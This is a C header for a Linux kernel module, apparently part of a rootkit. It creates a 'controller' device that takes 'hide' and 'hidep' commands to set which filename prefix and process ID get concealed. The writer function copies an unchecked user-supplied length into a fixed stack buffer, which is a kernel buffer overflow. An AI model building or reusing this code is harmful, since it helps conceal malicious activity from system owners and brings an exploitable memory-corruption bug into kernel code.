#ifndef DEVICE_HANDLER
    #define DEVICE_HANDLER

#include <linux/miscdevice.h> // dev
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/uaccess.h> // copy to/from user space



#define DEVICE_SIZE 512 // size of possible input in bytes
char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace
char PREFIX[DEVICE_SIZE] = "asdfasdfasdfasdfasdf"; // filename prefix to hide
char hide_pid[NAME_MAX]; // pid to hide


ssize_t reader(struct file *filep,char *buff,size_t count,loff_t *offp)
{
    if (copy_to_user(buff, last_data, strlen(last_data)) != 0) { // copy last written data to user using the device
        printk("Kernel -> userspace copy failed!\n");
        return -1; // return error
    }
    return strlen(last_data); // return length of data that was copied
}


ssize_t writer(struct file *filep,const char *buff,size_t count,loff_t *offp) // function to get config of what to hide and what type
{
    char tmpdata[DEVICE_SIZE + 1];
    if (copy_from_user(tmpdata, buff, count) != 0) {
        printk("Userspace -> kernel copy failed!\n");
        return -1;
    }
    if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
        if(strlen(tmpdata) > strlen("hide ") + 3){
            strcpy(last_data, tmpdata + strlen("hide "));
            strcpy(PREFIX, last_data);
        }
    }
    if(memcmp("hidep ", tmpdata, strlen("hidep ")) == 0){
        if(strlen(tmpdata) > strlen("hidep ")){
            strcpy(last_data, tmpdata + strlen("hidep "));
            strcpy(hide_pid, last_data);
        }
    }
    printk(KERN_INFO "%s\n", last_data);
    return 0;
}


struct file_operations fops = { // file operations on device file, what functions to call when reading/writing
    read: reader,
    write: writer
};

static struct miscdevice controller = { // device configuration in file system and kernel
    .minor = MISC_DYNAMIC_MINOR,
    .name = "controller",
    .fops = &fops
};

#endif